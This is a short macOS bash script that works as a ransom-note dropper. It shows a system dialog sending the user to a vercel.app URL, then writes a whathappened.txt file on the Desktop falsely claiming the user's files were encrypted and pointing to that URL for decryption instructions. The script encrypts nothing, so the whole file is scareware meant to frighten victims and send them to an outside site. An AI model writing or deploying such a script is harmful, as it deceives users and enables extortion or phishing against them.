#!/bin/bash

osascript <<EOF
display dialog "Go to https://jfrha-2-bd-12.vercel.app" buttons {"OK"} default button "OK"
EOF
cd ~/Desktop/
touch whathappened.txt
echo "Your files were encrypted, go to https://jfrha-2-bd-12.vercel.app to get decryption instructions." > whathappened.txt
